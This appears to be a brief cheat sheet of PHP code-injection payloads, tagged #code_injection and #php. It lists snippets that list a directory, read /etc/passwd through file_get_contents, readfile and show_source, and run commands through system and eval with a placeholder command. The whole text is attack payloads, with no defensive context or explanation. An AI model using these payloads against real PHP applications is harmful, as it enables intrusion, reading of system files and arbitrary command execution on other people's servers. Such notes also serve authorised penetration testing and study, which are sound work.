#code_injection #php 

## Directory Content
```php
print_r(scandir('.'));
```

## File Content
```php
file_get_contents('/etc/passwd');
```

```php
readfile('/etc/passwd');
```

```php
show_source('/etc/passwd');
```

## Command Execution
```php
system("MY_COMMAND");
```

```php
eval("MY_COMMAND");
```